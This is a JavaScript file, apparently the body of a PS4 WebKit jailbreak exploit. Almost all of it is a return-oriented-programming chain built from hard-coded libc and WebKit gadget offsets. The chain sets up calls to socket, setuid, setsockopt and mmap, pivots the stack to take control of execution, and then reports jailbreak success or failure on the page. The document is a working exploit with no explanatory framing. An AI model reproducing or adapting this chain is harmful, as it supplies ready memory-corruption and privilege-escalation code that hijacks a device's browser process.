libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
socket_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+392504, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
setuid_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+393832, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
setsockopt_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+395160, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967112, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+792472, 
mmap_addr,
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967192, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+396488, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+10235455, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+785193, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+11, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
webkit_base+7438103, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+811575, 
libc_base+471355, 
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([216, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967072, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967080, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([200, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967088, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([192, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967096, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([184, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967104, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877 
]);
db([176, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+792472 
]);
db([4294967280, 4294967295]); 
set_gadgets([
webkit_base+5202439, 
libc_base+793877 
]);
db([4294967216, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+547950, 
libc_base+877175, 
libc_base+793877 
]);
db([1, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([48, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+759626, 
libc_base+471355, 
libc_base+793877 
]);
db([32, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877 
]);
db([24, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([128, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+397864, 
webkit_base+7438103, 
libc_base+811575 
]);
db([0, 0]); 
db([0, 0, 100000, 0, 0, 0]);
db([0, 0, 100000, 0, 0, 0]);
db([979788149, 174335264, 0, 0]);
ropchain_offset += 2;
db([1952737651, 807419168, 2020091256, 628633632, 175664236, 0]);
db([1801678707, 1030976613, 1797284901, 1969583473, 624784229, 2660]);
db([543580533, 169962351, 0, 0]);
db([1919252079, 1601200492, 544760937, 1680154685, 10, 0]);
db([1919252079, 1601200492, 544760937, 1680154685, 10, 0]);
db([1601463655, 1769237360, 678389358, 540876841, 680997, 0]);
db([544498793, 1868981602, 1663067506, 1970434671, 1869182064, 2112110]);
db([2016555045, 32]);
db([10, 0]);
db([544498793, 1702127201, 1868767346, 1886745202, 1852795252, 2105402]);
db([2016555045, 32]);
db([10, 0]);
db([1601463667, 1769237360, 678389358, 540876841, 680997, 0]);
db([1634889843, 1634557817, 540876912, 1814394928, 686188, 0]);
set_gadgets([
libc_base+788575, 
ropchain+398264, 
webkit_base+14461559, 
libc_base+206806, 
ropchain+398288, 
webkit_base + 0x36f8ef,
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+398336, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575 
]);
db([0, 0]); 
set_gadget(ropchain+398352,); 
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+398608, 
webkit_base+14461559, 
libc_base+793877 
]);
db([4294967200, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877, 
ropchain+398648, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+191168, 
libc_base+793877, 
ropchain+398696, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+206806, 
ropchain+398544 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4294901759, 4294967295]); 
set_gadget(webkit_base+5202439,); 
db([0, 0]); 
set_gadget(ropchain+398608,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967200, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877 
]);
db([4294964280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+788575, 
ropchain+399112, 
webkit_base+14461559, 
libc_base+788575 
]);
db([12792335, 0]); 
set_gadgets([
libc_base+207901, 
libc_base+788575, 
ropchain+398912, 
webkit_base+14461559, 
libc_base+792472 
]);
db([3221225730, 0]); 
db([0, 0]); 
set_gadgets([
libc_base+206806, 
ropchain+398984, 
libc_base+207901, 
libc_base+846253, 
libc_base+206806, 
ropchain+398988, 
libc_base+207901, 
libc_base+788575 
]);
db([0, 0]); 
set_gadgets([
libc_base+186490, 
libc_base+792472 
]);
db([8, 0]); 
set_gadgets([
libc_base+407313, 
libc_base+792472 
]);
db([72, 0]); 
set_gadgets([
libc_base+407313, 
libc_base+186490, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+1838146, 
libc_base+793877 
]);
db([0, 0]); 
set_gadgets([
webkit_base+4185979, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([1179403647, 0]);
set_gadgets([
libc_base+207901, 
libc_base+793877 
]);
db([4294966128, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+180192, 
libc_base+207901, 
libc_base+793877 
]);
db([4294967262, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([105961, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+788575 
]);
db([55, 0]); 
set_gadget(libc_base+793877,); 
db([4294266680, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+270033, 
libc_base+793877 
]);
db([4294967293, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+270033, 
libc_base+793877 
]);
db([4291139525, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([1259, 0]); 
set_gadgets([
libc_base+207900, 
libc_base+793877 
]);
db([3432168, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([32227377, 0]); 
set_gadgets([
libc_base+207901, 
libc_base+793877 
]);
db([4289525250, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([37008, 0]); 
set_gadgets([
libc_base+207900, 
libc_base+793877 
]);
db([4283557566, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([2, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+50775, 
libc_base+792472 
]);
db([4280278604, 4294967295]); 
set_gadgets([
webkit_base+1838146, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([0, 1]); 
set_gadget(libc_base+471355,); 
db([0, 0]); 
set_gadgets([
webkit_base + 0x3cf3f4,
libc_base+11 
]);
db([67, 0]); 
db([514, 0]); 
set_gadget(ropchain+398256,); 
db([59, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(webkit_base+3750700,); 
db([514, 0]); 
db([0, 0]); 
set_gadget(ropchain+398208,); 
db([1224640840, 540045, 196608000, 251658240, 3224486661, 1996445123, 3251062792, 1024, 1149978705, 4173269028, 1207959552, 246460557, 45744468, 1207959552, 14131205, 1506868992, 1566564066, 2428747825]);
pivot(ropchain);
var main_ret = read_ptr_at(main_ret);
var printf_buf_end = read_ptr_at(ropchain+printf_buf_offset);
var printf_ans = read_mem_as_string(printf_buf, printf_buf_end-printf_buf);
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
var _ = malloc_nogc.pop();
if(main_ret==179||main_ret==0)
{window.msgs.innerHTML="<h1 style='font-size:30px;text-align:center;'>jailbreak 100/100 OK ✔</h1>";} 
else
{window.msgs.innerHTML="<h1 style='font-size:30px;text-align:center;'>Jailbreak failed! - Reboot your PS4 and try again.</h1>";}}